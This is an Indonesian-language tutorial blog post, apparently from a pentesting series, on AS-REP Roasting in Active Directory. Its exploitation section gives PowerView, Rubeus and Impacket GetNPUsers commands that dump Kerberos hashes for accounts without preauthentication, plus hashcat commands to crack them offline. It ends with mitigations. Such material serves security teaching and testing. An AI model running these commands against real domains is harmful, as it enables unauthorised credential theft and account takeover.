---
title: Part 3 - AS-REP Roasting
date: 2022-02-05 08:39:22 +0800
categories: [Active Directory, Initial Attack Vector]
tags: [active directory, windows, rubeus, impacket, hashcat, enumeration, exploit]     # TAG names should always be lowercase
author: nairpaa
---

### Tujuan 

- *Get a foothold user*

### Prasyarat

- Memiliki list user domain (untuk eksternal eksploit)
- Terdapat user yang tidak menggunakan *preauthentication*


### Tools

- Impacket
- Rubeus
- Hashcat

---

## Apa itu AS-REP Roasting?

**AS-REP Roasting** adalah serangan terhadap kerberos untuk akun pengguna yang tidak memerlukan *preauthentication*. *Preauthentication* adalah langkah pertama dalam otentikasi Kerberos, dan dirancang untuk mencegah serangan *password guessing*.

Selama *preauthentication*, pengguna akan memasukkan password mereka yang akan digunakan untuk mengenkripsi *timestamp* dan mencoba mendeskripsi dan memvalidasi bahwa password yang benar telah digunakan. 

Selanjutnya, TGT akan dibuatkan untuk pengguna melakukan otentikasi di masa mendatang. Jika *preauthentication* dinonaktifkan, penyerang dapat meminta data otentikasi untuk pengguna mana pun dan DC akan memberikan TGT terenkripsi yang dapat diderkipsi secara offline.

Untungnya, *preauthentication* diperlukan secara default di Active Directory. Namun, konfigurasi ini dapat diubah di pengaturan kontrol akun pengguna di setiap akun, seperti berikut:

![AS-REP Roasting](https://stealthbits.com/wp-content/uploads/2019/06/ASREP-1.png)



## Tahap Eksploitasi

### Internal

```powershell
# enumerasi ASREPRoastable user
PS> . .\PowerView.ps1
PS> Get-NetUser -PreauthNotRequired

# dapatkan tgt ticket
PS> Rubeus.exe asreproast

# export ticket hashcat format
PS> Rubeus.exe asreproast /format:hashcat /outfile:C:Temphashes.txt	

# ekstrak ticket dengan hashcat
PS> hashcat64.exe -m 18200 c:/pass-hash.txt example-dict.txt
```


### Eksternal

```bash
# enumerasi dan dapatkan export ticket
➜ GetNPUsers.py <domain>/ -usersfile <users.txt> -format <hashcat|john> -outputfile <output.txt> -no-pass -dc-ip

#  ekstrak ticket dengan hashcat
➜ hashcat -m 18200 pass.hash /usr/share/wordlists/rockyou.txt
```

## Mitigasi

- Identifikasi akun yang tidak memerlukan *preauthentication*
- Implementasikan password yang kuat
- Pastikan juga hak akses setiap pengguna sudah sesuai dengan kebijakan yang ada.
- Monitoring perubahan hak akses pengguna

## Referensi

- [Cracking Active Directory Password with AS-REP Roasting](https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/)
- [AS-REP Roasting by akimbocore](https://akimbocore.com/article/asrep-roasting/)